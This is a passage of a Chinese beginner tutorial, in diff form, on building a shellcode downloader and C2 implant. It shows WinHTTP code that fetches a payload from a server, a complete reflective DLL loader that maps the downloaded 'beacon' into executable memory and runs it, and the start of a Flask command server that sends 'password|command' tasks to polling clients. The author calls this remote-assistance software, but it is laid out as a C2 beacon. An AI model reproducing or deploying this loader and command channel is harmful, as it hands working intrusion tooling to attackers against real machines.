+        lpUrlComponents.dwUrlPathLength =
+        lpUrlComponents.dwUserNameLength = 36;
+</code></pre>
+<p>但是这里我们需要对原教程的代码做一个改正，</p>
+<pre><code>    _URL_INFO url = { 0 };
+    URL_COMPONENTSW lpUrlComponents = { 0 };
+</code></pre>
+<p>要改为：</p>
+<pre><code>    _URL_INFO url
+    URL_COMPONENTSW lpUrlComponents
+</code></pre>
+<p>why?因为<code>= {0}</code>会让编译器自动生成memset，进而崩坏无法运行。
+<img alt="如图" src="../image/28.png" /></p>
+<h4 id="_8">逐句分析环节</h4>
+<p>上面这坨代码到底在干嘛？——<strong><em>给 WinHttpCrackUrl 准备“接收解析结果的容器”</em></strong>
+why？
+因为 Windows API 的设计就是:
+“我不帮你分配内存，你自己准备好，我帮你把解析完URL的结果填入准备好的内存里”
+举个例子:
+你调用：<code>WinHttpCrackUrl("http://127.0.0.1/duck", ...)</code>
+解析结果放哪？</p>
+<pre><code>Host = 127.0.0.1
+Path = /duck
+</code></pre>
+<p>系统不知道放哪！！！
+所以你必须告诉它：“把 HostName 写到这个 buffer 里”,即</p>
+<pre><code>lpUrlComponents.lpszHostName = url.szHostName;
+</code></pre>
+<p>关系图如下：
+WinHttpCrackUrl()
+↓
+解析URL
+↓
+把结果写进 URL_COMPONENTSW
+↓
+URL_COMPONENTSW 指向 /_URL_INFO</p>
+<h3 id="winhttp">加载 WinHTTP</h3>
+<p>回到操作</p>
+<p>把这坨东西贴在上面那坨代码后面,假设后续的beacon的路径是http://127.0.0.1/duck，(这个写你自己的地址)
+它在干什么？</p>
+<ol>
+<li>加载 winhttp.dll</li>
+<li>找 WinHttpOpen 地址</li>
+<li>转成函数</li>
+<li>保存到 fnWinHttpOpen</li>
+</ol>
+<pre><code>typedef HMODULE(WINAPI* WinHttpCrackUrlT)(_In_reads_(dwUrlLength) LPCWSTR pwszUrl, _In_ DWORD dwUrlLength, _In_ DWORD dwFlags, _Inout_ LPURL_COMPONENTS lpUrlComponents);
+    typedef HINTERNET(WINAPI* WinHttpOpenT)(_In_opt_z_ LPCWSTR pszAgentW,
+        _In_ DWORD dwAccessType,
+        _In_opt_z_ LPCWSTR pszProxyW,
+        _In_opt_z_ LPCWSTR pszProxyBypassW,
+        _In_ DWORD dwFlags);
+    typedef HINTERNET(WINAPI* WinHttpConnectT)(
+        IN HINTERNET hSession,
+        IN LPCWSTR pswzServerName,
+        IN INTERNET_PORT nServerPort,
+        IN DWORD dwReserved);
+    typedef HINTERNET(WINAPI* WinHttpOpenRequestT)(
+        IN HINTERNET hConnect,
+        IN LPCWSTR pwszVerb,
+        IN LPCWSTR pwszObjectName,
+        IN LPCWSTR pwszVersion,
+        IN LPCWSTR pwszReferrer OPTIONAL,
+        IN LPCWSTR FAR* ppwszAcceptTypes OPTIONAL,
+        IN DWORD dwFlags);
+    typedef BOOL(WINAPI* WinHttpSendRequestT)(
+        IN HINTERNET hRequest,
+        _In_reads_opt_(dwHeadersLength) LPCWSTR lpszHeaders,
+        IN DWORD dwHeadersLength,
+        _In_reads_bytes_opt_(dwOptionalLength) LPVOID lpOptional,
+        IN DWORD dwOptionalLength,
+        IN DWORD dwTotalLength,
+        IN DWORD_PTR dwContext);
+    typedef BOOL(WINAPI* WinHttpReceiveResponseT)(
+        IN HINTERNET hRequest,
+        IN LPVOID lpReserved);
+    typedef BOOL(WINAPI* WinHttpQueryHeadersT)(
+        IN     HINTERNET hRequest,
+        IN     DWORD     dwInfoLevel,
+        IN     LPCWSTR   pwszName OPTIONAL,
+        _Out_writes_bytes_to_opt_(*lpdwBufferLength, *lpdwBufferLength) __out_data_source(NETWORK) LPVOID lpBuffer,
+        IN OUT LPDWORD   lpdwBufferLength,
+        IN OUT LPDWORD   lpdwIndex OPTIONAL);
+    typedef BOOL(WINAPI* WinHttpCloseHandleT)(
+        IN HINTERNET hInternet);
+    constexpr char strWinHttpCrackUrl[] = &quot;WinHttpCrackUrl&quot;;
+    constexpr char strWinHttpOpen[] = &quot;WinHttpOpen&quot;;
+    constexpr char strWinHttpConnect[] = &quot;WinHttpConnect&quot;;
+    constexpr char strWinHttpOpenRequest[] = &quot;WinHttpOpenRequest&quot;;
+    constexpr char strWinHttpSendRequest[] = &quot;WinHttpSendRequest&quot;;
+    constexpr char strWinHttpReceiveResponse[] = &quot;WinHttpReceiveResponse&quot;;
+    constexpr char strWinHttpQueryHeaders[] = &quot;WinHttpQueryHeaders&quot;;
+    constexpr char strWinHttpCloseHandle[] = &quot;WinHttpCloseHandle&quot;;
+    constexpr char strWinhttp[] = &quot;Winhttp.dll&quot;;
+    constexpr wchar_t strUrl[] = L&quot;http://127.0.0.1/duck&quot;;
+    constexpr wchar_t strHead[] = L&quot;HEAD&quot;;
+    constexpr wchar_t strHTTP[] = L&quot;HTTP/1.1&quot;;
+    constexpr wchar_t strGet[] = L&quot;GET&quot;;
+</code></pre>
+<p><img alt="如图" src="../image/29.png" /></p>
+<h4 id="_9">逐句分析环节</h4>
+<p>typedef = 定义函数形状
+字符串 = 找函数名字
+GetProcAddress = 拿函数地址
+函数指针 = 调用 API</p>
+<p>这些 typedef 分别是什么？
+解析 URL</p>
+<pre><code>WinHttpCrackUrlT
+</code></pre>
+<p>创建“会话”（类似打开浏览器）</p>
+<pre><code>WinHttpOpenT
+</code></pre>
+<p>连接服务器（IP + 端口）</p>
+<pre><code>WinHttpConnectT
+</code></pre>
+<p>创建 HTTP 请求（GET / HEAD）</p>
+<pre><code>WinHttpOpenRequestT
+</code></pre>
+<p>发送请求</p>
+<pre><code>WinHttpSendRequestT
+</code></pre>
+<p>接收响应</p>
+<pre><code>WinHttpReceiveResponseT
+</code></pre>
+<p>读取响应头（比如 Content-Length）</p>
+<pre><code>WinHttpQueryHeadersT
+</code></pre>
+<p>关闭连接</p>
+<pre><code>WinHttpCloseHandleT
+</code></pre>
+<p>ok，回到操作，我们继续粘贴复制</p>
+<h3 id="api">准备 API</h3>
+<pre><code>WinHttpCrackUrlT fnWinHttpCrackUrl = (WinHttpCrackUrlT)fnGetProcAddress(fnLoadlibrary(strWinhttp), (char*)strWinHttpCrackUrl);
+    WinHttpOpenT fnWinHttpOpen = (WinHttpOpenT)fnGetProcAddress(fnLoadlibrary(strWinhttp), (char*)strWinHttpOpen);
+    WinHttpConnectT fnWinHttpConnect = (WinHttpConnectT)fnGetProcAddress(fnLoadlibrary(strWinhttp), (char*)strWinHttpConnect);
+    WinHttpOpenRequestT fnWinHttpOpenRequest = (WinHttpOpenRequestT)fnGetProcAddress(fnLoadlibrary(strWinhttp), (char*)strWinHttpOpenRequest);
+    WinHttpSendRequestT fnWinHttpSendRequest = (WinHttpSendRequestT)fnGetProcAddress(fnLoadlibrary(strWinhttp), (char*)strWinHttpSendRequest);
+    WinHttpReceiveResponseT fnWinHttpReceiveResponse = (WinHttpReceiveResponseT)fnGetProcAddress(fnLoadlibrary(strWinhttp), (char*)strWinHttpReceiveResponse);
+    WinHttpQueryHeadersT fnWinHttpQueryHeaders = (WinHttpQueryHeadersT)fnGetProcAddress(fnLoadlibrary(strWinhttp), (char*)strWinHttpQueryHeaders);
+    WinHttpCloseHandleT fnWinHttpCloseHandle = (WinHttpCloseHandleT)fnGetProcAddress(fnLoadlibrary(strWinhttp), (char*)strWinHttpCloseHandle);
+</code></pre>
+<h4 id="_10">分析</h4>
+<table>
+<thead>
+<tr>
+<th>API</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>WinHttpOpen</td>
+<td>创建会话</td>
+</tr>
+<tr>
+<td>WinHttpConnect</td>
+<td>建立连接</td>
+</tr>
+<tr>
+<td>WinHttpOpenRequest</td>
+<td>创建请求</td>
+</tr>
+<tr>
+<td>WinHttpSendRequest</td>
+<td>发送</td>
+</tr>
+<tr>
+<td>WinHttpReceiveResponse</td>
+<td>收响应</td>
+</tr>
+<tr>
+<td>WinHttpQueryHeaders</td>
+<td>查header</td>
+</tr>
+<tr>
+<td>WinHttpReadData</td>
+<td>读数据</td>
+</tr>
+</tbody>
+</table>
+<h3 id="_11">创建会话</h3>
+<p>创建会话时候要注意如下几点:</p>
+<p>fnWinHttpCrackUrl这个API的最后一个参数是输出,是系统的结构,但里面的指针是你提供的内存,指向你自己的 buffer
+fnWinHttpOpen可以有两个选项：一个是WINHTTP_ACCESS_TYPE_NO_PROXY代表不走代理；另外一个是走代理,走代理的话可以先设置前置代理再做,这个算home work
+lpUrlComponents的URL上限被之前定义了,是32字节,超过会溢出,可以自己调整.但是不要太大,会爆栈
+以下是代码</p>
+<pre><code> // 创建一个会话
+    fnWinHttpCrackUrl(strUrl, 0, ICU_ESCAPE, &amp;lpUrlComponents);
+    HINTERNET hSession = fnWinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
+    DWORD dwReadBytes, dwSizeDW = sizeof(dwSizeDW), dwContentSize, dwIndex = 0;
+</code></pre>
+<p>打开会话
+<code>hSession = fnWinHttpOpen(...)</code></p>
+<h3 id="head">第一次请求（HEAD）,获取下载大小</h3>
+<p>为什么要 HEAD？因为你要先问：这个文件多大？知道文件大小,这样才能分配好内存。</p>
+<pre><code>// 创建一个连接
+    HINTERNET hConnect = fnWinHttpConnect(hSession, lpUrlComponents.lpszHostName, lpUrlComponents.nPort, 0);
+    // 创建一个请求，先查询内容的大小
+    HINTERNET hRequest = fnWinHttpOpenRequest(hConnect, strHead, lpUrlComponents.lpszUrlPath, strHTTP, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
+    fnWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+    fnWinHttpReceiveResponse(hRequest, 0);
+    fnWinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, NULL, &amp;dwContentSize, &amp;dwSizeDW, &amp;dwIndex);
+    fnWinHttpCloseHandle(hRequest);
+
+</code></pre>
+<p>发送请求
+<code>WinHttpSendRequest</code>
+<code>WinHttpReceiveResponse</code>
+连接服务器
+<code>hConnect = fnWinHttpConnect(...)</code></p>
+<h3 id="_12">获取数据</h3>
+<p>// 创建一个请求，获取数据
+获取文件大小:<code>WinHttpQueryHeaders(...)</code>
+得到：<code>dwContentSize</code>
+dwContentSize就是payload的大小,</p>
+<pre><code> // 创建一个请求，获取数据
+    hRequest = fnWinHttpOpenRequest(hConnect, strGet, lpUrlComponents.lpszUrlPath, strHTTP, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
+    fnWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+    fnWinHttpReceiveResponse(hRequest, 0);
+
+    fnWinHttpCloseHandle(hRequest);
+    fnWinHttpCloseHandle(hConnect);
+    fnWinHttpCloseHandle(hSession);
+
+</code></pre>
+<p>当前仅为请求，还未开始下载
+原教程是这样写的：dwContentSize是payload的大小,最后调用WinHttpReadData即可完成一次文件下载</p>
+<pre><code>pBuffer = fnMalloc(dwContentSize);
+ZeroMemory(pBuffer, dwContentSize);
+//完成下载
+WinHttpReadData(hRequest, pBuffer, dwContentSize, &amp;dwReadBytes);
+</code></pre>
+<p>对于零基础啥也不懂的人来说，按照这个教程实操会发现，这个是不可能运行成功的，pBuffer = fnMalloc(dwContentSize);这一句会显示报错e002，且如果完全按照这个教程复制粘贴这些代码，就会存在很多错误！作为零基础的人是根本不懂哪里出问题的，现在来告诉你我认为我发现到的问题（当然我也有可能有错误，必须自己实践操作，不能依赖粘贴复制）：</p>
+<ol>
+<li>缺少关键 API，根本没有解析 WinHttpReadData，原教程只加载了：WinHttpOpen、WinHttpSendRequest、WinHttpReceiveResponse</li>
+<li>fnMalloc 根本不存在，前面只解析了 memcpy，但没有定义 / 解析 malloc</li>
+<li>没有声明pBuffer</li>
+<li>两种调用方式混在一起了，<code>WinHttpReadData(hRequest, pBuffer, dwContentSize, &amp;dwReadBytes)</code>是 直接调用 API,但是没有链接Winhttp.lib,所以链接器找不到它,会报错LNK2001</li>
+<li>要删掉<code>ZeroMemory(pBuffer, dwContentSize);</code>因为在 shellcode 里：ZeroMemory 不是一个真正的函数，它其实是个 宏：<code>#define ZeroMemory(Destination,Length) memset((Destination),0,(Length))</code>，也就是说ZeroMemory → memset。在普通程序里：memset 来自 C 运行库（CRT），编译器会自动帮你链接（比如 msvcrt.dll），但是在shellcode里，它没有导入表、CRT，没有自动链接，因此对 shellcode 来说，memset 根本不存在！这也是之前我们提到的：需要把
+   <code>_URL_INFO url = { 0 };</code>
+   <code>URL_COMPONENTSW lpUrlComponents = { 0 };</code>
+   要改为：
+   <code>_URL_INFO url</code>
+   <code>URL_COMPONENTSW lpUrlComponents</code>
+   的原因——因为<code>= {0}</code>会让编译器自动生成memset！！！！</li>
+</ol>
+<p>询问ai说到，并不推荐使用malloc，同时原教程也在后面也改用了rawBuffer、VirtualAlloc，所以别慌张，这不是你的问题，别气馁！一步步进行下去！！！</p>
+<p>我是这样的改的：
+加上了</p>
+<pre><code>    typedef void* (WINAPI* mallocT)(size_t);
+    typedef BOOL(WINAPI* WinHttpReadDataT)(
+        IN HINTERNET hRequest,
+        _Out_writes_bytes_to_(dwNumberOfBytesToRead, *lpdwNumberOfBytesRead) __out_data_source(NETWORK) LPVOID lpBuffer,
+        IN DWORD dwNumberOfBytesToRead,
+        OUT LPDWORD lpdwNumberOfBytesRead);
+    typedef void* (WINAPI* memcpyT)(
+        _Out_writes_bytes_all_(_Size) void* _Dst,
+        _In_reads_bytes_(_Size)       void const* _Src,
+        _In_                          size_t      _Size);
+    void* pBuffer = nullptr;
+</code></pre>
+<pre><code>    constexpr char strWinHttpReadData[] = &quot;WinHttpReadData&quot;;
+    constexpr char strMemcpy[] = &quot;memcpy&quot;;
+    constexpr char strMalloc[] = &quot;malloc&quot;;
+    constexpr char strMsvcrt[] = &quot;msvcrt.dll&quot;;
+</code></pre>
+<pre><code>    mallocT fnMalloc = (mallocT)fnGetProcAddress(fnLoadlibrary(strMsvcrt), strMalloc);
+    WinHttpReadDataT fnWinHttpReadData = (WinHttpReadDataT)fnGetProcAddress(fnLoadlibrary(strWinhttp), (char*)strWinHttpReadData);
+    memcpyT fnMemcpy = (memcpyT)fnGetProcAddress(fnLoadlibrary(strMsvcrt), (char*)strMemcpy);
+</code></pre>
+<p>然后把原教程的这一段</p>
+<pre><code>    pBuffer = fnMalloc(dwContentSize);
+    ZeroMemory(pBuffer, dwContentSize);
+    //完成下载
+    WinHttpReadData(hRequest, pBuffer, dwContentSize, &amp;dwReadBytes);
+</code></pre>
+<p>改为</p>
+<pre><code>    pBuffer = fnMalloc(dwContentSize);
+    ZeroMemory(pBuffer, dwContentSize);
+    //完成下载
+    fnWinHttpReadData(hRequest, pBuffer, dwContentSize, &amp;dwReadBytes);
+</code></pre>
+<p>并放在这一段之前</p>
+<pre><code>    fnWinHttpCloseHandle(hRequest);
+    fnWinHttpCloseHandle(hConnect);
+    fnWinHttpCloseHandle(hSession);
+</code></pre>
+<p>现在运行一下，然后把正确的shellcode填进去（图片没截全，但是你懂得就行）
+<img alt="如图" src="../image/30.png" />
+现在就需要用到hfs了，我们双击hfs.exe，会弹出powershell弹窗还有一个网页，如图下
+我们点击网页的侧栏中的<code>share files</code>，
+点击加号<code>+</code>，
+随便放一个文件，
+然后改名为duck，
+点击<code>保存</code>
+<img alt="如图" src="../image/31.png" />
+现在我们点击运行，可以看到这些弹窗
+<img alt="如图" src="../image/32.png" />
+接着我们点击hfs网页，看日志log，没错，我们成功下载了duck
+<img alt="如图" src="../image/33.png" />
+完美，现在我们可以开启下一步了！！</p>
+<h2 id="beacon-dll">三、beacon编写，手动把 DLL 加载到内存并执行</h2>
+<p>首先我们先尝试写一个正常的dll,然后用信息框弹出一个hello world,用vs新建一个项目叫做beacon
+由于前面shellcode 是 x86的，因此此时写的 DLL 也必须是 x86，因此需要把beacon改成x86-release,并关闭安全选项
+MD改成MT
+如图
+<img alt="如图" src="../image/beacon-1.png" />
+<img alt="如图" src="../image/beacon-2.png" />
+<img alt="如图" src="../image/beacon-3.png" /></p>
+<p>因为MD是动态链接,体积是很小,而其他机子可能没有正常加载这些 DLL、没有初始化 CRT，同时可能目标机器没有这些库
+MT是全打包,不依赖外部 CRT，就能够支持
+| 条件 | 原因 |
+| ------- | ------------ |
+| x86 | 架构一致 |
+| Release | 去掉调试依赖 |
+| 关闭安全选项 | 避免 cookie 崩溃 |
+| MT | 全打包，不依赖外部 CRT |</p>
+<p>配置完后,编写我们的第一个beacon hello world:</p>
+<pre><code>BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        MessageBoxA(NULL, &quot;hello i am beacon&quot;, NULL, NULL);
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+</code></pre>
+<p><img alt="如图" src="../image/beacon-4.png" /></p>
+<h3 id="beacon">加载beacon</h3>
+<p>现在，捋清楚我们要干啥？
+首先，DLL 不能直接执行，因为它不是一段完整的可执行代码，和shellcode相比，DLL 本质不同：shellcode 是纯代码，可以直接执行；而DLL是一个结构化文件（PE），且当前</p>
+<ol>
+<li>内存没展开</li>
+<li>从错误位置执行</li>
+<li>地址没修正</li>
+<li>API 没填</li>
+<li>没正确调用入口</li>
+<li>环境不完整</li>
+</ol>
+<p>因此不能直接执行。</p>
+<p>所以，DLL 运行前必须做4件事：</p>
+<ul>
+<li>展开内存（按节区重新排布）</li>
+<li>重定位（修正地址）</li>
+<li>修复导入表（让 API 能用）</li>
+<li>调用入口（DllMain）</li>
+</ul>
+<p>所以接下去我们就：</p>
+<ol>
+<li>
+<p>下载 DLL → rawBuffer（文件原始数据）</p>
+</li>
+<li>
+<p>解析 PE 结构（读头）</p>
+</li>
+<li>
+<p>申请真正运行用的内存（imageBuffer）</p>
+</li>
+<li>
+<p>把 DLL “展开”到内存</p>
+</li>
+<li>
+<p>重定位（解决地址变化）</p>
+</li>
+<li>
+<p>修复导入表（让 API 能用）</p>
+</li>
+<li>
+<p>调用 DLL 入口（DllMain）</p>
+</li>
+</ol>
+<h4 id="raw">申请一块raw内存</h4>
+<pre><code>// 创建一个请求，获取数据
+    hRequest = fnWinHttpOpenRequest(hConnect, strGet, lpUrlComponents.lpszUrlPath, strHTTP, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
+    fnWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+    fnWinHttpReceiveResponse(hRequest, 0);
+    typedef LPVOID(WINAPI* VirtualAllocT)(
+        _In_opt_ LPVOID lpAddress,
+        _In_     SIZE_T dwSize,
+        _In_     DWORD flAllocationType,
+        _In_     DWORD flProtect);
+    constexpr char strVirtualAlloc[] = &quot;VirtualAlloc&quot;;
+    VirtualAllocT fnVirtualAlloc = (VirtualAllocT)fnGetProcAddress((HMODULE)kernel32_base, (char*)strVirtualAlloc);
+    //别介意代码风格突变,这是另外一个项目复制粘贴的.
+    const auto fileSize = dwContentSize;
+    void* rawBuffer = fnVirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    fnWinHttpReadData(hRequest, rawBuffer, fileSize, &amp;dwReadBytes);
+</code></pre>
+<p><img alt="如图" src="../image/34.png" />
+<img alt="如图" src="../image/35.png" /></p>
+<h4 id="pe">解析PE头</h4>
+<pre><code>    //把之前的链接关掉
+    fnWinHttpCloseHandle(hRequest);
+    fnWinHttpCloseHandle(hConnect);
+    fnWinHttpCloseHandle(hSession);
+
+    PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)rawBuffer;
+    PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)((LPBYTE)rawBuffer + pIDH-&gt;e_lfanew);
+</code></pre>
+<p><img alt="如图" src="../image/36.png" />
+<img alt="如图" src="../image/37.png" /></p>
+<h4 id="pe_1">解析到PE头后,拿到真实大小</h4>
+<pre><code>    void* imageBuffer = fnVirtualAlloc(NULL, pINH-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    fnMemcpy(imageBuffer, rawBuffer, pINH-&gt;OptionalHeader.SizeOfHeaders);
+</code></pre>
+<p><img alt="如图" src="../image/38.png" /></p>
+<h4 id="peraw">展开PE,拷贝raw内存的数据到更大的内存里面</h4>
+<pre><code>    PIMAGE_SECTION_HEADER pISH = (PIMAGE_SECTION_HEADER)(pINH + 1);
+
+    for (size_t i = 0; i &lt; pINH-&gt;FileHeader.NumberOfSections; i++)
+    {
+        fnMemcpy((PVOID)((LPBYTE)imageBuffer + pISH[i].VirtualAddress), (PVOID)((LPBYTE)rawBuffer + pISH[i].PointerToRawData), pISH[i].SizeOfRawData);
+    }
+</code></pre>
+<p><img alt="如图" src="../image/39.png" /></p>
+<h4 id="_13">重定位</h4>
+<pre><code>//重定位
+    DWORD delta = (DWORD)((LPBYTE)imageBuffer - pINH-&gt;OptionalHeader.ImageBase); // Calculate the delta
+    PIMAGE_BASE_RELOCATION pIBR = (PIMAGE_BASE_RELOCATION)((LPBYTE)imageBuffer + pINH-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+    while (pIBR-&gt;VirtualAddress)
+    {
+        if (pIBR-&gt;SizeOfBlock &gt;= sizeof(IMAGE_BASE_RELOCATION))
+        {
+            DWORD count = (pIBR-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
+            PWORD list = (PWORD)(pIBR + 1);
+
+            for (size_t i = 0; i &lt; count; i++)
+            {
+                if (list[i])
+                {
+                    PDWORD ptr = (PDWORD)((LPBYTE)imageBuffer + (pIBR-&gt;VirtualAddress + (list[i] &amp; 0xFFF)));
+                    *ptr += delta;
+                }
+            }
+        }
+
+        pIBR = (PIMAGE_BASE_RELOCATION)((LPBYTE)pIBR + pIBR-&gt;SizeOfBlock);
+    }
+</code></pre>
+<p><img alt="如图" src="../image/40.png" /></p>
+<h4 id="_14">修复导入表</h4>
+<pre><code>//导入表修复
+    PIMAGE_IMPORT_DESCRIPTOR pIID = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)imageBuffer + pINH-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
+    while (pIID-&gt;Characteristics)
+    {
+        PIMAGE_THUNK_DATA OrigFirstThunk = (PIMAGE_THUNK_DATA)((LPBYTE)imageBuffer + pIID-&gt;OriginalFirstThunk);
+        PIMAGE_THUNK_DATA FirstThunk = (PIMAGE_THUNK_DATA)((LPBYTE)imageBuffer + pIID-&gt;FirstThunk);
+
+        HANDLE hModule = fnLoadlibrary((LPCSTR)imageBuffer + pIID-&gt;Name);
+
+        while (OrigFirstThunk-&gt;u1.AddressOfData)
+        {
+            if (OrigFirstThunk-&gt;u1.Ordinal &amp; IMAGE_ORDINAL_FLAG)
+            {
+                // Import by ordinal
+
+                DWORD Function = (DWORD)fnGetProcAddress((HMODULE)hModule, (char*)(OrigFirstThunk-&gt;u1.Ordinal &amp; 0xFFFF));
+                FirstThunk-&gt;u1.Function = Function;
+            }
+
+            else
+            {
+                // Import by name
+                PIMAGE_IMPORT_BY_NAME pIBN = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)imageBuffer + OrigFirstThunk-&gt;u1.AddressOfData);
+                DWORD Function = (DWORD)fnGetProcAddress((HMODULE)hModule, (char*)pIBN-&gt;Name);
+
+                FirstThunk-&gt;u1.Function = Function;
+            }
+
+            OrigFirstThunk++;
+            FirstThunk++;
+        }
+
+        pIID++;
+    }
+</code></pre>
+<p><img alt="如图" src="../image/41.png" /></p>
+<h4 id="_15">运行</h4>
+<pre><code>//一切就绪 call一下entry
+    typedef BOOL(WINAPI* PDLL_MAIN)(HMODULE, DWORD, PVOID);
+    PDLL_MAIN EntryPoint = (PDLL_MAIN)((LPBYTE)imageBuffer + pINH-&gt;OptionalHeader.AddressOfEntryPoint);
+    EntryPoint((HMODULE)imageBuffer, DLL_PROCESS_ATTACH, NULL); // Call the entry point
+</code></pre>
+<p><img alt="如图" src="../image/42.png" />
+接着把上面的地址改为http://192.168.1.5/beacon.dll</p>
+<p><img alt="如图" src="../image/43.png" />
+现在我们就又要用到hfs了，双击hfs.exe，然后把beacon.dll上传
+<img alt="如图" src="../image/44.png" />
+开启调用
+<img alt="如图" src="../image/45.png" />
+点击运行
+<img alt="如图" src="../image/46.png" />
+当当当当！！！我们成功了！
+<img alt="如图" src="../image/47.png" />
+<img alt="如图" src="../image/48.png" /></p>
+<h2 id="_16">四、服务器编写</h2>
+<p>进行到这一步，我们要做好以下准备：</p>
+<ol>
+<li>准备好python3,并把pip的源换成国内的</li>
+<li>安装好flask（在1的基础上在命令行输入python -m pip install flask，即可安装好flask）</li>
+<li>vscode</li>
+</ol>
+<p>为什么要用 Flask？
+因为 咱们是零基础小白，而python + HTTP 更简单，能更快上手！</p>
+<p>Flask 是一个“用 Python 写 Web 服务”的框架，可以帮咱们快速写一个网站 / 接口服务器</p>
+<h3 id="flaskhello-world">flask的第一个hello world</h3>
+<p>新建一个.py文件，复制粘贴下面这坨代码：</p>
+<pre><code>from flask import Flask
+app = Flask(__name__)
+
+
+@app.route(&quot;/&quot;)
+def root():
+    return '你好世界'
+
+
+if __name__ == &quot;__main__&quot;:
+    app.run(debug=True, host=&quot;0.0.0.0&quot;)
+</code></pre>
+<h4 id="_17">逐行解释分析</h4>
+<ol>
+<li>创建 Flask 应用</li>
+</ol>
+<pre><code>app = Flask(__name__)
+</code></pre>
+<p>相当于：创建一个“服务器对象”</p>
+<ol>
+<li>定义接口（重点！）</li>
+</ol>
+<pre><code>@app.route(&quot;/&quot;)
+</code></pre>
+<p>意思是：当别人访问http://你的IP:5000/, 就执行下面这个函数</p>
+<pre><code>def root():
+    return '你好世界'
+</code></pre>
+<p>本质就是：URL → 对应一个函数 → 返回结果</p>
+<ol>
+<li>启动服务器</li>
+</ol>
+<pre><code>app.run(debug=True, host=&quot;0.0.0.0&quot;)
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>debug=True</td>
+<td>开发模式（报错更清晰）</td>
+</tr>
+<tr>
+<td>host=0.0.0.0</td>
+<td>允许外部访问</td>
+</tr>
+</tbody>
+</table>
+<p><img alt="如图" src="../image/49.png" />
+ok，回到操作
+我们打开控制台输入python 你的py文件名.py
+<img alt="如图" src="../image/50.png" />
+网页访问url
+<img alt="如图" src="../image/52.png" />
+<img alt="如图" src="../image/51.png" />
+当当当当！“你好世界”就映入眼帘了！</p>
+<p>现在我们先捋顺思路,了解一些概念：</p>
+<p><strong>接口（API）</strong>
+后面会出现的：</p>
+<pre><code>/api/v1/client/get_cmd
+/api/v1/server/send_cmd
+</code></pre>
+<p>这些都叫：接口（API） = 一个 URL 对应一个功能</p>
+<p><strong>HTTP 通信模型的整体流程</strong></p>
+<ol>
+<li>客户端轮询</li>
+</ol>
+<pre><code>GET /api/v1/client/get_cmd
+</code></pre>
+<p>客户端来拿命令:<code>/api/v1/client/get_cmd</code></p>
+<p>服务端返回：</p>
+<pre><code>密码|命令
+</code></pre>
+<ol>
+<li>
+<p>客户端执行命令</p>
+</li>
+<li>
+<p>客户端把结果发回来</p>
+</li>
+</ol>
+<pre><code>POST /api/v1/server/get_respone
+</code></pre>
+<p>客户端执行完，上传结果:<code>/api/v1/server/get_respone</code>
+body = 执行结果</p>
+<ol>
+<li>服务端查看结果</li>
+</ol>
+<pre><code>GET /api/v1/server/get_client_respone
+</code></pre>
+<ol>
+<li>服务端下发命令</li>
+</ol>
+<pre><code>GET /api/v1/server/send_cmd?key=xxx&amp;cmd=xxx
+</code></pre>
+<hr />
+<p>由于我们都是零基础小白，我们这里就使用最传统的结构,也就是文本分隔符
+定为：
+客户端的密码|指令</p>
+<pre><code>密码 | 指令
+
+1111|dir
+</code></pre>
+<p>客户端在密码正确的情况下返回回显</p>
+<p>1111 = 密码（验证身份）
+dir = 要执行的命令</p>
+<p>！我们没有在做C2,我们在做的是合法的远程协助软件.合法的远程协助是需要客户端的密码的，这样代表是授权了！</p>
+<p>综上，我们需要干什么？</p>
+<ul>
+<li>我们需要有个接口让客户端不断循环访问,接受命令然后执行</li>
+<li>我们需要有个接口让客户端执行完毕后返回回显给我们</li>
+<li>我们需要有个接口让我们能输入命令</li>
+</ul>
+<hr />
+<p>ok，知道了要干什么，我们就继续</p>
+<h3 id="-">客户端 -&gt; 服务端接口</h3>
+<p>复制粘贴下面这坨到py文件里</p>
+<pre><code>@app.route('/api/v1/client/get_cmd', methods=['GET'])
+def client_get_cmd():
+    return &quot;这是命令&quot;
+</code></pre>
+<p><img alt="如图" src="../image/53.png" />
+啥意思？：客户端访问/api/v1/client/get_cmd的时候,执行方法
+client_get_cmd，返回一个”这是命令”</p>
+<p>把这个代码放到上面空白的地方后,访问http://xxxxxx/api/v1/client/get_cmd
+应该看得到这个接口的返回值了:</p>
+<p><img alt="如图" src="../image/54.png" />
